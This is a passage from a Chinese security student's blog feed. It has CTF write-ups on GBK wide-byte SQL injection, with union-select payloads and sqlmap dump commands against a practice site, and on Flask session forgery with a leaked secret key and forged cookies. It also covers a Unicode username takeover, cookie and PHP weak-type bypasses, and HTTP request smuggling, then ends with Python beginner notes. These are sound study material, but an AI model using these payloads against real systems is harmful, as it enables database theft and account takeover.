    </entry>
    
    
    
    <entry>
      <title>宽字节注入</title>
      <link href="/2021/02/09/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/02/09/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><pre><code> 在使用php连接数据库的时候，当设置“set character_set_client=gbk”时会导致一个编码问题，也就是我们熟悉的宽字节 注入，注入%DF%27的时候，即可把%5c吃掉，举个例子</code></pre><p><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p><p>当我们输入id=1’ and 1=1%23,查询语句是select id,title from news where id = ‘2&#39; or 1=1#’，显然&#39;被转义，不能发挥闭合作用。但如果我们输入id=2%df’ or 1=1 %23,查询语句为’2綅’ or 1=1 #’，显然现在这个’未被转义，可以发挥其自身作用。</p><pre><code>  宽字节注入是利用了mysql一个特性，mysql在使用gbk在进行编码的时候，会认为两个字节是一个汉字（前一个ascii的编码  要大于128，达到汉字的范围）。这就是mysql的特性，因为gbk是字节编码，他认为两个字节代表一个汉字，所以%df和后面   的\也就是%5c中变成了一个汉字“运”，而逃逸了出来。</code></pre><p>就直接手工注入<br></p><li>id=%df%27%20union%20select%201,%20database()%23<li>id=%df%27 union select 1,group_concat(table_name)from information_schema.tables where table_schema=database()%23<li>id=%df' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634%23<pre><code> 爆字段的时候，where table_name=&quot;ctf4&quot;,这里还是涉及了转义，如果不用“”也是会出现报错的，感觉因为这个应该是字符 串是要带&#39;&#39;，所以我们采用传换成16进制的方法，0x63746634，因为mysql数据库是默认认识16进制的，会将其作为字符串 读入.</code></pre><h1>主要还是想学习一下sqlmap注入</h1><li>python sqlmap.py -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes --dbs<br>这里运用了一个脚本，unmagicquotes，用于宽字符绕过。<p><img src="1.png"></p><li>python sqlmap.py -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes -D `sae-chinalover` --tables<p><img src="2.png"></p><li>python sqlmap.py -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes -D `sae-chinalover` -T ctf4 --columns<p><img src="3.png"></p><li>python sqlmap.py -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes -D `sae-chinalover` -T ctf4 -C flag]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hctf2018 admin</title>
      <link href="/2021/02/08/admin/"/>
      <url>/2021/02/08/admin/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>又是一项大工程</p><span id="more"></span><p>看了一下有login，register，posts（发post），chenge password，logout。然后注册的时候，我试了下admin，说是这个admin，已经被注册过了，并且注释了也有说，你不是admin。然后我是想，把admin所对应的密码爆出来，但是没成功，就没办法了。应该不像是万能密码之类的。<br>哦，不是爆不出来，是密码字典不行，密码123，登上去就直接出来flag<br><br>看wp<br><br>因为有change password的功能，可能可以通过修改密码的功能改掉admin的密码，然后以admin登录。在change password的源代码处，发现有一个<a href="https://github.com/woadsl1234/hctf_flask/%EF%BC%8C">https://github.com/woadsl1234/hctf_flask/，</a><br><br>这是一个flask项目，代码结构简单如下图。</p><p><img src="1.jpg"></p><p>flask项目，就先去路由去看一下，打开route.py,看一下index的注册函数代码。</p><pre><code> @app.route(&#39;/&#39;)@app.route(&#39;/index&#39;)def index():return render_template(&#39;index.html&#39;, title = &#39;hctf&#39;)</code></pre><p>发现index的注册码没有做什么处理，那就直接返回index.html渲染模板，于是我们看一下templates/index.html代码。</p><pre><code>&#123;% include('header.html') %&#125;&#123;% if current_user.is_authenticated %&#125;    <h1 class="nav">Hello &#123;&#123; session['name'] &#125;&#125;</h1>    &#123;% endif %&#125;&#123;% if current_user.is_authenticated and session['name'] == 'admin' %&#125;    <h1 class="nav">hctf&#123;xxxxxxxxx&#125;</h1>    &#123;% endif %&#125;&lt;!-- you are not admin --&gt;&lt;h1 class=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;&#123;% include('footer.html') %&#125;</code></pre><p>从上述代码可以看出，只有登录admin才可以得到flag。于是继续看向route.py文件，看看login和change password地注册函数嘛是怎么写的。route,py部分代码如下：</p><pre><code>   @app.route(&#39;/register&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])</code></pre><p>def register():</p><pre><code>if current_user.is_authenticated:    return redirect(url_for(&#39;index&#39;))form = RegisterForm()if request.method == &#39;POST&#39;:    name = strlower(form.username.data)    if session.get(&#39;image&#39;).lower() != form.verify_code.data.lower():        flash(&#39;Wrong verify code.&#39;)        return render_template(&#39;register.html&#39;, title = &#39;register&#39;, form=form)    if User.query.filter_by(username = name).first():        flash(&#39;The username has been registered&#39;)        return redirect(url_for(&#39;register&#39;))    user = User(username=name)    user.set_password(form.password.data)    db.session.add(user)    db.session.commit()    flash(&#39;register successful&#39;)    return redirect(url_for(&#39;login&#39;))return render_template(&#39;register.html&#39;, title = &#39;register&#39;, form = form)@app.route(&#39;/login&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])def login():if current_user.is_authenticated:    return redirect(url_for(&#39;index&#39;))form = LoginForm()if request.method == &#39;POST&#39;:    name = strlower(form.username.data)    session[&#39;name&#39;] = name    user = User.query.filter_by(username=name).first()    if user is None or not user.check_password(form.password.data):        flash(&#39;Invalid username or password&#39;)        return redirect(url_for(&#39;login&#39;))    login_user(user, remember=form.remember_me.data)    return redirect(url_for(&#39;index&#39;))return render_template(&#39;login.html&#39;, title = &#39;login&#39;, form = form)@app.route(&#39;/logout&#39;)def logout():logout_user()return redirect(&#39;/index&#39;)@app.route(&#39;/change&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])def change():if not current_user.is_authenticated:    return redirect(url_for(&#39;login&#39;))form = NewpasswordForm()if request.method == &#39;POST&#39;:    name = strlower(session[&#39;name&#39;])    user = User.query.filter_by(username=name).first()    user.set_password(form.newpassword.data)    db.session.commit()    flash(&#39;change successful&#39;)    return redirect(url_for(&#39;index&#39;))return render_template(&#39;change.html&#39;, title = &#39;change&#39;, form = form)</code></pre><h1>解法一————flask session伪造</h1><p>flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防止篡改，而无法防止被读取。而flask并没有提供加密操作，所以其所有的session的内容是可以在客户端被读取的，这也可以造成一些安全问题。<br>我们可以用python脚本把flask的session揭秘出来，但是如果想要加密成自己的session的话，还需要知道flask用来签名的<mark>secret_key</mark>,在github中找，可以在config.py里发现下面代码</p><pre><code>   import osclass Config(object):SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;SQLALCHEMY_DATABASE_URI = &#39;mysql+pymysql://root:adsl1234@db:3306/test&#39;SQLALCHEMY_TRACK_MODIFICATIONS = True</code></pre><p>估计ckj123就是secret_key，所以session伪造这条路可以走，于是在github上找找看有没有flask session加密的脚本。</p><p><img src="2.jpg"></p><p>把脚本down下来，然后执行，脚本代码如下。</p><pre><code>flask_session_manager.py   &quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;__author__ = &#39;Wilson Sumanang, Alexandre ZANNI&#39;# standard importsimport sysimport zlibfrom itsdangerous import base64_decodeimport ast# Abstract Base Classes (PEP 3119)if sys.version_info[0] &lt; 3: # &lt; 3.0raise Exception(&#39;Must be using at least Python 3&#39;)elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4from abc import ABCMeta, abstractmethodelse: # &gt; 3.4from abc import ABC, abstractmethod # Lib for argument parsingimport argparse# external Importsfrom flask.sessions import SecureCookieSessionInterfaceclass MockApp(object):def __init__(self, secret_key):    self.secret_key = secret_keyif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4class FSCM(metaclass=ABCMeta):    def encode(secret_key, session_cookie_structure):        &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;        try:            app = MockApp(secret_key)            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))            si = SecureCookieSessionInterface()            s = si.get_signing_serializer(app)            return s.dumps(session_cookie_structure)        except Exception as e:            return &quot;[Encoding error] &#123;&#125;&quot;.format(e)            raise e    def decode(session_cookie_value, secret_key=None):        &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;        try:            if(secret_key==None):                compressed = False                payload = session_cookie_value                if payload.startswith(&#39;.&#39;):                    compressed = True                    payload = payload[1:]                data = payload.split(&quot;.&quot;)[0]                data = base64_decode(data)                if compressed:                    data = zlib.decompress(data)                return data            else:                app = MockApp(secret_key)                si = SecureCookieSessionInterface()                s = si.get_signing_serializer(app)                return s.loads(session_cookie_value)        except Exception as e:            return &quot;[Decoding error] &#123;&#125;&quot;.format(e)            raise eelse: # &gt; 3.4class FSCM(ABC):    def encode(secret_key, session_cookie_structure):        &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;        try:            app = MockApp(secret_key)            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))            si = SecureCookieSessionInterface()            s = si.get_signing_serializer(app)            return s.dumps(session_cookie_structure)        except Exception as e:            return &quot;[Encoding error] &#123;&#125;&quot;.format(e)            raise e    def decode(session_cookie_value, secret_key=None):        &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;        try:            if(secret_key==None):                compressed = False                payload = session_cookie_value                if payload.startswith(&#39;.&#39;):                    compressed = True                    payload = payload[1:]                data = payload.split(&quot;.&quot;)[0]                data = base64_decode(data)                if compressed:                    data = zlib.decompress(data)                return data            else:                app = MockApp(secret_key)                si = SecureCookieSessionInterface()                s = si.get_signing_serializer(app)                return s.loads(session_cookie_value)        except Exception as e:            return &quot;[Decoding error] &#123;&#125;&quot;.format(e)            raise eif __name__ == &quot;__main__&quot;:# Args are only relevant for __main__ usage## Description for helpparser = argparse.ArgumentParser(            description=&#39;Flask Session Cookie Decoder/Encoder&#39;,            epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)## prepare sub commandssubparsers = parser.add_subparsers(help=&#39;sub-command help&#39;, dest=&#39;subcommand&#39;)## create the parser for the encode commandparser_encode = subparsers.add_parser(&#39;encode&#39;, help=&#39;encode&#39;)parser_encode.add_argument(&#39;-s&#39;, &#39;--secret-key&#39;, metavar=&#39;&lt;string&gt;&#39;,                            help=&#39;Secret key&#39;, required=True)parser_encode.add_argument(&#39;-t&#39;, &#39;--cookie-structure&#39;, metavar=&#39;&lt;string&gt;&#39;,                            help=&#39;Session cookie structure&#39;, required=True)## create the parser for the decode commandparser_decode = subparsers.add_parser(&#39;decode&#39;, help=&#39;decode&#39;)parser_decode.add_argument(&#39;-s&#39;, &#39;--secret-key&#39;, metavar=&#39;&lt;string&gt;&#39;,                            help=&#39;Secret key&#39;, required=False)parser_decode.add_argument(&#39;-c&#39;, &#39;--cookie-value&#39;, metavar=&#39;&lt;string&gt;&#39;,                            help=&#39;Session cookie value&#39;, required=True)## get argsargs = parser.parse_args()## find the option chosenif(args.subcommand == &#39;encode&#39;):    if(args.secret_key is not None and args.cookie_structure is not None):        print(FSCM.encode(args.secret_key, args.cookie_structure))elif(args.subcommand == &#39;decode&#39;):    if(args.secret_key is not None and args.cookie_value is not None):        print(FSCM.decode(args.cookie_value,args.secret_key))    elif(args.cookie_value is not None):        print(FSCM.decode(args.cookie_value))</code></pre><p>脚本有解密加密的作用，具体用法如下：</p><li>解密：python flask_session_manager.py decode -c -s #-c是cookie里的session的值， -s是SECRET-KEY<li>加密：python flask_session_manager.py encode -s -t #-s是SECRET-KEY，-t是session的参照格式，也是session解密后的格式<p>我们把登录页面的cookie中的session复制下来：</p><pre><code>  .eJw9j0FrwkAQhf9K2XMPZmMugofCakhgJmxYXWYvoqlNMnEstIXEFf97QwveHnyPj_fu6tC_q9VdvZzUSqGHDOMmBtl2IFYjFxH8bkJNsXJNSq6YUGCJhib0pVSm7IOxY3Ado-kuxNhXeT1nSpH3Ambu5nALbBfAkJAUGiIOFJsxcDmAFCnp0AVnR8y3HMzmBgYFtZ3QNAmwXYKDSH6XAZcMPGjgWoCbtXq8qub76-Pw8zmcr88LYEgTtxHy0FF8y2ieUfndAuYcZH8JOd1I6gFdm5KnGJgyGNd_ul6O7flp8vttQvafXI8yA5Woxy_gZmLE.YCEcrA.rHKFgybomMZRkOtrUtERWPlSF9M</code></pre><p>解出来是</p><pre><code> &#123;&#39;_id&#39;: b&#39;5c9713faa2d66231e17f3977a216c84615bf82bd40e8c48eb3b8dc46765f0384c2f44235bb633dc70f2d2b7cfae404acd1203f7d1475248133ae922c29624f27&#39;, &#39;csrf_token&#39;: b&#39;066b830fac09b5f9e4309feedf2bdd587af3f693&#39;, &#39;image&#39;: b&#39;YQua&#39;, &#39;name&#39;: &#39;1&#39;&#125;</code></pre><p>然后将name:后面的1改为admin，进行加密，得到session。</p><pre><code> .eJw9j0Frg0AQhf9K2XMPcY2XQA6FTURhRlZMltlLSE2qjhkLbUHdkP9eaSG3B9_j4727OnUXtbmrl3e1UeggwbALXvYtiNXIWQB3mFBTKKo6piqbUGCNhiZ0uRQm77yxo69aRtPeiLEr0nLJFCMfBczSTWH2bFfAEJFkGgL2FOrRc96DZDFp3_rKjpju2ZvdDAYFtZ3Q1BGwXUMFgdwhAc4ZuNfApQDXW_V4VfX318fp57O_Ds8LYEgTNwFS31J4S2iZUbjDCpbs5XjzKc0kZY9VE5Oj4JkSGLd_uk7OzfVpcsd9RPafDGdZgDpfpBvU4xdxz2Sc.YCEm7Q.qff8PxWgZCxrPTSvX8vQa94gv_0</code></pre><p>后面应该就是改cookie，但是，我没有成功。很是i奇怪</p><h1>unicode欺骗</h1>我们可以发现，不管是login，register还是change页面，只要是关于session【“name”】的操作，都会先用strlower函数将name转成小写，但是python里有自带的转小写的函数lower，这里重写了一个，可能有猫腻，于是找到了strlower函数的定义。<pre><code>    def strlower(username):username = nodeprep.prepare(username)return username</code></pre><p>这里用到了nodeprep.prepare函数，而nodeprep是从twisted模块中导入的from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep，在requirements.txt文件中，发现这里用到的twisted版本是Twisted==10.2.0，而官网最新版本为19.2.0(2019/6/2)，版本差距这么大，估计是存在什么漏洞，于是搜索一下nodeprep.prepare，找到一篇unicode安全的文章，<a href="https://paper.tuisec.win/detail/a9ad1440249d95b">https://paper.tuisec.win/detail/a9ad1440249d95b</a></p><p>这里原理就是利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。<br>所以当我们用ᴬdmin注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成Admin，我们用ᴬdmin进行登录，可以看到index页面的username变成了Admin，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可。</p><p>我们发现在改密码函数代码里，也用到了nodeprep.prepare函数，也就是说，我们在这里改密码的话，先会把username改为admin，从而改掉admin的密码。<br>用改的密码登录即可</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buyflag</title>
      <link href="/2021/02/08/buyflag/"/>
      <url>/2021/02/08/buyflag/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>知识点</h1><li>cookie权限，这道题bp抓包后，有提示说是一定要是cuit的学生才可以去buyflag，并且可以发现cookie这里有：user=0，我们都知道在计算机中1是正确，0是错误，所以尝试改cookie，改为user=1，成功。<li>长度限制，要输入购买金额，money=1000000000，输入后提示说，字数太长了，了解后得知，一般是用strcmp去控制长度，这个函数在介绍php弱类型的时候谢写过了，可以用数组绕过。还有一个是用科学计数法绕过，1e9<li>password还是采用了，php弱类型<pre><code>if (isset($_POST[&#39;password&#39;])) &#123;$password = $_POST[&#39;password&#39;];if (is_numeric($password)) &#123;    echo &quot;password can&#39;t be number&lt;/br&gt;&quot;;&#125;elseif ($password == 404) &#123;    echo &quot;Password Right!&lt;/br&gt;&quot;;&#125;&#125;</code></pre><p>输入404a就可以了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>http走私</title>
      <link href="/2021/02/05/http%E8%B5%B0%E7%A7%81/"/>
      <url>/2021/02/05/http%E8%B5%B0%E7%A7%81/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>HTTP/1.1协议</h1><h2>定义：</h2>HTTP(超文本传输协议)：一种无状态的、应用层、以请求/应答方式运行的协议，它使用可扩展的语义和自描述消息格式，与基于网络的超文本信息系统灵活的互动。<p>HTTP协议工作于客户端-服务端架构之上。浏览器作为HTTP客户端通过url向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。</p><p><img src="1.png"></p><p>客户端和服务器之间进行http请求时，请求和响应都是一个数据包，它们之间是需要一个传输通道的所以会先创建tcp连接，只有tcp连接后，才能发送http请求。</p><h2>TCP三次握手</h2><p>在创建过程中，三次握手就是代表着有三次网络传输，客户端发送一次，然后服务器·返回一次，然后客户端在发送一次，这时候才创建了TCP连接，然后才能发送http请求。</p><p>而HTTP/1.1和HTTP/1.0协议之所有不同，一部分也在于此：<br><br>在HTTP/1.0里面，这个连接是在http请求创建的时候，就去创建，然后连接创建完成之后，请求发送过去，服务器响应之后，这个tcp连接就关闭了</p><p>在HTTP/1.1协议中，可以用<mark>Keep-Alive</mark>方法去申明这个连接可以一直保持，那么第二个http请求就去没有三次握手的开销，而相较于HTTP/1.0,HTTP/1.1有了Pipeline，客户端可以项流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收请求后，需要遵循先入先出机制，将请求和响应严格的对应起来，再将响应发送给服务器。</p><h1>HTTP请求走私</h1><h2>产生原因</h2>为了提升用户的浏览器，提高使用体验，减轻服务器的负担，很多网站都使用了CDN加速服务器，最简单的加速服务器，就是在源站的前面加上了一个具有缓存功能·的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器就可以获取到，不用在从原站所在服务器获取。这就有了一个很典型的拓扑结构<p><img src="2.png"></p><p>反向代理服务器与后端的源站之间，会重新用TCP连接，因为代理服务器与后端的源站服务器IP地址是相对固定的，不同的用户请求通过代理服务器与源站服务器建立连接，所以就顺利成章了</p><p>但由于两者服务器的实现方式不同，如果用户提交模糊的请求，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但是源站服务器经过解析后，只认为其中的一部分为正常请求，剩下的那一部分就是走私的请求了，这就是HTTP走私请求的由来。</p><p>HTTP请求走私漏洞的原因就是由于HTTP规范提供了两种不同方式来指定请求的结束位置，他们是<mark>Content-Length</mark>标头和<mark>Transfer-Encoding</mark>标头,<mark>Content-Length</mark>标头简单明了，它以字节为单位指定消息内容体的长度，例如：</p><pre><code> POST / HTTP/1.1 Host: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Cookie: session=5n2xRNXtAYM9teOEn3jSkEDDabLe0Qv8 Content-Length: 35 a=11</code></pre><p><mark>Transfer-Encoding</mark>标头用于指定消息体使用分块编码（Chunked Encode），也就是说消息报文由一个或多个数据块组成，每个数据块大小以单位（16进制表示）衡量，后跟换行符，然后是快内容，最重要的是：整个消息体以大小为0的块结束，也就是说解析遇到0数据块就结束。如：</p><pre><code>   POST / HTTP/1.1  Host: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net  Content-Type: application/x-www-form-urlencoded  Transfer-Encoding: chunked  b  a=11  0</code></pre><p>相当于我发送请求，包含<mark>Content-Length</mark>，前端服务器解析后没有问题发送给后端服务器，但是我在请求时害包含了<mark>Transfer-Encoding</mark>，这样后端服务器进行解析的时候便可执行我写在下面的一些命令，这样便可以绕过前端waf。</p><h1>四种常见走私请求</h1><h2>CL不为0的GET请求</h2>假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略GET请求中地<mark>Content-Length</mark>头，不进行处理。这就很可能导致请求走私。<h2>CL-CL</h2>假设中间地代理服务器和后端地源站服务器在接收到类似请求时，都不会返回400错误，但是中间代理服务器按照第一个<mark>Content-Length</mark>地值对请求进行处理，而后端源站按照第二个<mark>Content-Length</mark>的值进行处理，这样便有可能引发请求走私。<h2>CL-TE</h2>所谓CL-TE，就是接收到存在两个请求头的1请求包时，前端服务器只处理<mark>Content-Length</mark>这一请求头，而后端服务器会遵顼RFC2616的规定，忽略掉<mark>Content-Length</mark>，处理<mark>Transfer-Encoding这一请求头</mark><h2>TE-CL</h2>当收到两个请求头的时候，前端处理<mark>Transfer-Encoding</mark>,后端处理<mark>Content-Length</mark><h1>实验实战</h1>在这个网络环境中，前端服务器实现安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件地相信前端服务器发来地全部请求，对每个请求都进行响应。<h2>CL-TE绕过前端服务器安全控制</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python</title>
      <link href="/2021/02/05/python/"/>
      <url>/2021/02/05/python/</url>
      
        <content type="html"><![CDATA[<h1>读取</h1><pre><code>   name=input(&quot;请输入你的名字&quot;)   age=input(&quot;请输入你的年龄&quot;)   print(name)   print(age)//注意使用input，输入的所有数据都是按照字符串来处理。</code></pre><h1>输出好看的文本</h1><pre><code>    name=input(&quot;请输入你的名字&quot;)    age=input(&quot;请输入你的年龄&quot;)    mag=&#39;&#39;&#39;    -----------start------------    Name=%s//%s是占位符，%s代表的是字符串，因为input，输入的字符串都是字符串类型，所以用%s进行占位，如果是数字采用%d，如果是浮点型采用%f    age=%s    -----------end--------------    &#39;&#39;&#39; %(name,age)    print(mag)</code></pre><p>//</p><pre><code>  在运行这个程序的时候，发现了一个问题，就是if语句，后面要记得加：号。  if question==&quot;y&quot; or question==&quot;Y&quot;:  print(&quot;jajajajajjaja&quot;)</code></pre><h1>运算符</h1><pre><code> a**b，表示的是a的b次方 a//b,表示的是a除了b的值的整数部分 and 表示&amp; or 表示！ not 表示！</code></pre><h1>缩进</h1><pre><code>首级代码必需顶行写二级代码要进行缩进，官方要求是4个空格</code></pre><h1>多个if分支</h1><pre><code>if elif else</code></pre><h1>一个猜随机数的小游戏</h1>调用random模块<pre><code>   import random n=random.randint(0,10) s=int(input(&quot;输入一个数&quot;))if s&gt;n:print(&quot;input smaller......&quot;)elif s&lt;n:print(&quot;input bigger....&quot;)else:print(&quot;you are right&quot;)print(n)</code></pre><p>修改了一下，让他能持续进行直到，相等</p><pre><code>import randoms=-1n=random.randint(0,10)while s!=n:s=int(input(&quot;输入一个数&quot;))if s&gt;n:  print(&quot;input smaller......&quot;)elif s&lt;n: print(&quot;input bigger....&quot;)if s==n:print(&quot;you are right&quot;)print(n)</code></pre><p>最多猜三次：</p><pre><code>import randomcount=0n=random.randint(0,10)while count&lt;3:s=int(input(&quot;输入一个数&quot;))if s&gt;n:  print(&quot;input smaller......&quot;)elif s&lt;n: print(&quot;input bigger....&quot;)else:   print(&quot;you are right&quot;)   print(n)   exit()count+=1print(n)</code></pre><p>升级版本</p><pre><code> import randomcount=0n=random.randint(0,10)def xunhuan(): count = 0 while count&lt;3: s=int(input(&quot;输入一个数&quot;)) if s&gt;n:   print(&quot;input smaller......&quot;) elif s&lt;n:   print(&quot;input bigger....&quot;) else:   print(&quot;you are right&quot;)   print(n)   exit() count+=1xunhuan()shuru=input(&quot;你还想继续吗&quot;)if shuru==&quot;n&quot; or &quot;N&quot;:exit()while shuru ==&quot;y&quot; or &quot;Y&quot; :xunhuan()shuru = input(&quot;你还想继续吗&quot;)//暂时没想起来更好的解法，就调用了一下函数</code></pre><h1>break和contiune</h1>这两个在当时学习c++的时候都不怎么清楚，现在稍微明白一点。这两个必需是跟着循环出来的，for和while如果不是循环会报错<pre><code>break:中止循环contimue：中止本次循坏a=0while a&lt;100:a+=1if a==50:    breakprint(a)//输出0~49</code></pre><p>//</p><pre><code>a=0while a&lt;100:a+=1if a&lt;50 and a&gt;40:    continueprint(a)//40~50没有打印出来</code></pre><h1>一道简单的计算题</h1>    n=int(input("输入一个数"))    s=2    sum=0    while s<=n:    if s%2==0:        sum=sum+s    else:        sum=sum-s    s+=1    print(sum)//计算2-3+4-5......-或+n<h1>打印一个图像</h1><pre><code> * ** *** **** ***** **** *** ** *</code></pre><p>//</p><pre><code> i=1while i&lt;=9:if i&lt;=5:    print(&quot;*&quot;*i)else:    print(&quot;*&quot;*(10-i))i+=1</code></pre><p>//升级</p><pre><code>i=1n=int(input(&quot;输入一个数字&quot;))while i&lt;=(2*n-1):if i&lt;=5:    print(&quot;*&quot;*i)else:    print(&quot;*&quot;*(2*n-i))i+=1</code></pre><h1>死循环</h1><pre><code> while true</code></pre><h1>双色球</h1><pre><code>red_list=[]blue_list=[]while len(red_list)&lt;6:num=int(input(&quot;请输入第%s个数:&quot;%(len(red_list)+1)))if num&gt;1 and num&lt;16:    if num not in red_list:        red_list.append(num)    else:        print(&quot;该数字存在，请重新输入&quot;)else:    print(&quot;该数超出范围&quot;)while len(blue_list) &lt; 2:num = int(input(&quot;请输入第%s个数：&quot;%(len(blue_list)+1)))if num &gt; 1 and num &lt; 8:    if num not in blue_list:        blue_list.append(num)    else:        print(&quot;该数字存在，请重新输入&quot;)else:    print(&quot;该数超出范围&quot;)print (&quot;红球：&quot;)print(red_list)print (&quot;篮球&quot;)print(blue_list)</code></pre><h1>确定和判断变量类型</h1><pre><code>type():确定是什么类型is ：type() is XXX是的返回true，不是返回falseis not:type() is not XXX (字符串：str)</code></pre><h1>三元运算符</h1><p>原来：</p><p>a=10;b=20;if a&gt; 100: c=a else: c=b</p><p>现在：<br>a=10;b=20;c=a if a&gt;100 else b</p><p>c=值1 if 条件 else 值2</p><h1>列表的曾删改查</h1><p>增：append，追加在最后。name.append(元素)</p><p>insert：指定位置插入。name.insert(索引，元素)</p><p>extend：合并两个列表name.extend(列表)</p><p>还有个嵌套列表<br>name=[“q”,”w”,”e”]</p><p>name.insert(2,[1,2,3])</p><p>name=[“q”,”w”,[1,2,3],”e”]</p><p>name[2][2]=3</p><p>删：<br>clear：清空，liebiao.clear()</p><p>pop:删除并返回删除元素。name.pop(),删除最后一个并返回该元素，name.pop(索引)，删除指定元素并返回该元素</p><p>del：直接删。del name[2]   name=[“q”,”w”,”e”]</p><p>remove：如果该元素重复，删除从左到右数的第一个元素，name.remove(元素)，如果remove的元素不存在，则返回错误</p><p>修：就直接对着元素索引修改<br>name[1]=”a”</p><p>name=[“a”,”w”,”e”]</p><p>name[-1]=”h”(倒着数，第一位是-1)</p><p>name=[“a”,”w”,”h”]</p><p>查：index：查下标，如果查询的元素在列表中没有，返回错误，name.index(元素).补充，name.index(元素，开始的索引 默认是0，结束索引  默认为字符串的长度)</p><p>count：统计该元素出现的次数，name.count(元素)</p><p>如果想判断，列表中，有没有某个元素，我们可以使用： 元素 in 列表 如果有返回true 如果没有返回false</p><h1>切片</h1>正切片：<p>可以同时取出多个元素，name=[1,2,3,4,5]</p><p>name[1:3]=[2,3] (顾头不顾尾，就是他只能包含最开始的所引所代表的元素，最后面的元素不包含，也就是说start：end-1)</p><p>name[1:-1]=[2,3,4]</p><p>name[:2]=[1,2]</p><p>name[1:]=[2,3,4,5] </p><p>倒着切：</p><p>因为，python默认是从左到右，所以我们应该写name[-4:-1]=[2,3,4]</p><p>name[-4:]=[2,3,4,5]</p><p>步长：步子的长度，默认是1，其实name[1:-1]的全名应该是name[1:-1:1].<br><br>如果我们想把列表倒着输出2，我们可以使用name[::-1]<br><br>上面讲的倒着切，其实我们也可以这个子写：name[-1:-4:-1]=[4,3,2]<br><br>我们也可以跳着切name[1::2]=[2,4]<br><br>其实用这种方法字符串也可以实现反转：a=”hello”  a[::-1]=’olleh’<br></p><h1>反转原列表</h1>我们知道，可以使用切片的方法实现列表的反转，但我们始终没有改变源列表，正经的改变源列表的方法是reverse  name.reserve() name=[5,4,3,2,1]<h1>排序</h1><p>用的是sort这个函数，从小到大排列。name=[1,4,3,4,2,5] name.sort() name=[1,2,3,4,4,5]</p><p>排序只能字符串和字符串，数字和数字在一起排列，字符串的排列依靠下面的那张表</p><p><img src="1.png"></p><p>s=[‘@’,’4’,’&amp;’,’ASFD’,’<em>‘],s.sort() s=[‘&amp;’, ‘4’, ‘@’, ‘ASFD’, ‘</em>‘]</p><h1>for循环</h1><p>for i in s:<br>print(i)</p><p>&amp;<br><br>4<br><br>@<br><br>ASFD<br><br>_<br></p><h1>元组</h1>只读列表，曾删改查中只有查可以工作，其他跟列表一样。另外列表用的是[],元组用的是(),比如name=(1,2,3)<p>元组本身不能修改，如果元组中存在可修改的数据类型，那么该数据可以被修改：name=(1,2,3,[4,5])  name[1]=5  报错 name[3][1]=”hi”,成功修改</p><h1>字符串</h1><p>是有下标，有序的，然后它相当于一个列表，也是只能读，不可修改的，他也可以进行切片，他也有步长。将一个字符串颠倒a=”hello”  a[::-1]=’olleh’<br></p><p>可以进行两个字符串相加，如果有特殊字符，需要转义，如果name=‘cky\n’，print(name)=cky<br>//空行<br>如果想要转义，可以，name=r’cky\n’,r是原生字符的意思，此时print（name）=’cky\n’<br></p><h2>一些常用的函数</h2>capitalize()首字母大写<p>casefold（）把大写都变成小写</p><p>center()补两边的长度，具体name=‘cky lsy’ name.center(50,”^”)     ^^^^^^^^^^^^^^^^^^^^^cky lsy^^^^^^^^^^^^^^^^^^^^^^</p><p>count()统计某个字符在该字符串中有几个，count(字符，字符，开始的索引 默认是0，结束的索引 